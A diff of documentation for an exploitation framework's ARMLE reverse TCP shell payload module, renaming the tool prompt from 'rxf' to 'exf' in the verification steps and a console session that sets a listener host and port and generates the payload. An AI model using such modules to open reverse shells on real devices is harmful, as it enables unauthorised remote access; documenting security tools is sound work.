@@ -4,7 +4,7 @@ Module generates payload that creates interactive tcp reverse shell for ARMLE ar
 
 ## Verification Steps
 
-  1. Start `./rxf.py`
+  1. Start `./exf.py`
   2. Do: `use payloads/armle/reverse_tcp`
   3. Do: `set lhost 192.168.1.4`
   4. Do: `set lport 4321`
@@ -13,13 +13,13 @@ Module generates payload that creates interactive tcp reverse shell for ARMLE ar
 ## Scenarios
 
 ```
-rxf >
-rxf > use payloads/armle/reverse_tcp
-rxf (ARMLE Reverse TCP) > set lhost 192.168.1.4
+exf >
+exf > use payloads/armle/reverse_tcp
+exf (ARMLE Reverse TCP) > set lhost 192.168.1.4
 [+] lhost => 192.168.1.4
-rxf (ARMLE Reverse TCP) > set lport 4321
+exf (ARMLE Reverse TCP) > set lport 4321
 [+] lport => 4321
-rxf (ARMLE Reverse TCP) > run
+exf (ARMLE Reverse TCP) > run
 [*] Running module...
 [*] Generating payload
 [+] Building payload for python
